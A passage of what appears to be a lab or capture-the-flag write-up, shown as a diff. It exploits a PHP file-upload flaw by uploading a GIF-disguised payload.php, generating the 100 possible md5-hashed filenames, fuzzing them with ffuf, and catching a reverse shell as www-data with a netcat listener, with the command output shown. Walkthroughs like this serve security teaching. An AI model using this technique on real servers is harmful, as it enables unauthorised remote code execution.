@@ -283,4 +283,51 @@ $ file payload.php
 payload.php: GIF image data, version 89a, 15370 x 28735
 ```
 
-I successfully upload the payload into the server. Now, it's time to access and trigger the payload `/uploads/payload.php`
+I successfully upload the payload into the server. Now, it's time to access and trigger the payload `/uploads/payload.php`, but look at the `upload.php` function
+```
+$rand_number = rand(1,100);
+$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
+```
+
+The file name will be uploaded with this format, so I have to create a lists with random number from 1,100 then fuzz with with `ffuf`
+Creating the list
+```
+$ for num in $(seq 1 100); do echo -n "payload.php$num" | md5sum | sed 's/  -/.php/g' >> hash.txt; done
+$ head hash.txt
+057fbfe6b1649e4af94db5b579b35036.php
+c095f674cacdf661e5757c9956b726f0.php
+ed1fd452da584d81da1fbe47bdff7860.php
+dece8246e3897532826e44994c1f019b.php
+6db2aa9d1e1a1b0965ffa4fe5a7003e9.php
+4e328c8b568263b2486133a83139e665.php
+abdfeeebd30e39229844e7be44330b84.php
+397a27a1a54e2a6642e2f9e23d0d4afe.php
+eab906c2875302246f68ccb603ff2048.php
+8940af50ffa55e0036a58795d53e2cd9.php
+```
+
+Fuzzing time
+```
+$ ffuf -w hash.txt -u http://192.168.56.103:8000/uploads/FUZZ
+<SNIP>
+4c09f01f419b7207ef5ed4e8b325b378.php [Status: 200, Size: 291, Words: 30, Lines: 6, Duration: 2ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+<SNIp>
+```
+
+However, to utilize the fuzzing phase, I set up a listener ready before executing `ffuf`
+```
+$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 55606
+Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux           
+ 13:56:41 up  2:55,  0 users,  load average: 13.00, 13.00, 13.00                                                    
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               
+sh: 0: can't access tty; job control turned off                                                                     
+$ whoami                                                                                                            
+www-data 
+
+```
+
+Therefore, when if fuzz the target to find the uploaded file, it would trigger the payload
